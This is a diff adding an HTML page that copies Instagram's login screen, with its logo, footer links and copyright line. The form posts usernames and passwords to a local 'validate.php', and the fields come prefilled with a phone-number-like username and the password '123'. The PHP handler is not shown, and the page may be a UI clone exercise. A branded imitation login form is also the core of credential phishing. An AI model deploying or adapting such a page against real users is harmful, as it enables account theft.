@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<title>Instagram Login Page</title>
+	<link rel="stylesheet" href="styles.css">
+	<script>
+		function validateForm() {
+			var username = document.getElementById("username").value;
+			var password = document.getElementById("password").value;
+			if (username == "" || password == "") {
+				alert("Both username and password must be filled out");
+				return false;
+			}
+			return true;
+		}
+	</script>
+</head>
+<body>
+
+<div class="wrapper">
+	<div class="header">
+		<div class="top">
+			<div class="logo">
+				<img src="instagram.png" alt="instagram" style="width: 175px;">
+			</div>
+			<div class="form">
+				<form action="validate.php" method="POST" onsubmit="return validateForm()">
+					<div class="input_field">
+						<input type="text" placeholder="Phone number, username, or email" class="input" id="username" name="username" value="6303259395">
+					</div>
+					<div class="input_field">
+						<input type="password" placeholder="Password" class="input" id="password" name="password" value="123">
+					</div>
+					<div class="btn">
+						<button type="submit">Log In</button>
+					</div>
+				</form>
+			</div>
+			<div class="or">
+				<div class="line"></div>
+				<p>OR</p>
+				<div class="line"></div>
+			</div>
+			<div class="dif">
+				<div class="fb">
+					<img src="facebook.png" alt="facebook">
+					<p>Log in with Facebook</p>
+				</div>
+				<div class="forgot">
+					<a href="#">Forgot password?</a>
+				</div>
+			</div>
+		</div>
+		<div class="signup">
+			<p>Don't have an account? <a href="#">Sign up</a></p>
+		</div>
+
+		</div>
+	</div>
+	<div class="footer">
+		<div class="links">
+			<ul>
+				<li><a href="#">ABOUT US</a></li>
+				<li><a href="#">SUPPORT</a></li>
+				<li><a href="#">PRESS</a></li>
+				<li><a href="#">API</a></li>
+				<li><a href="#">JOBS</a></li>
+				<li><a href="#">PRIVACY</a></li>
+				<li><a href="#">TERMS</a></li>
+				<li><a href="#">DIRECTORY</a></li>
+				<li><a href="#">PROFILES</a></li>
+				<li><a href="#">HASHTAGS</a></li>
+				<li><a href="#">LANGUAGE</a></li>
+			</ul>
+		</div>
+		<div class="copyright">
+			© 2019 INSTAGRAM
+		</div>
+	</div>
+</div>
+</body>
+</html>
